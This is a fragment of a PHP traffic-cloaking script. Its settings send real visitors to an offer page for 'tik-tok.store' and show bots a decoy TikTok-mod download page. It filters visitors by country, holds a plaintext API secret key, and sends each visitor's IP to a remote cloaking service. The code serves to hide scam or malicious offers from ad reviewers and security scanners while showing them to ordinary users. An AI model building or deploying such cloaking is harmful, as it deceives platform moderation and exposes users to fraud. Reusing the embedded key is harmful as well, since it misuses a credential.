...
/* Required settings     */
$HCSET['OFFER_PAGE'] = 'tik-tok.store';//PHP/HTML file or URL offer used for real users
$HCSET['WHITE_PAGE'] = 'https://5play.org/10913-tiktok-mod.html';//PHP/HTML file or URL used for bots
...
$HCSET['FILTER_GEO_LIST'] = 'RU'; // string([2Chars country codes])
...
$HCSET['API_SECRET_KEY'] = 'v1cdce6f7c421c48948139f0bfbb7bf9e3';
/*********************************************/
...
function apiRequest($ip, $port, $HCSET, $HCSETdata)
{
    ...
    $url = 'http://'.$host.'/basic?ip=' . $ip . '&port=' . $port . '&key=' . $HCSET['API_SECRET_KEY'] . '&sign=v2-586198286&js=false&stage='.$HCSET['stage'];
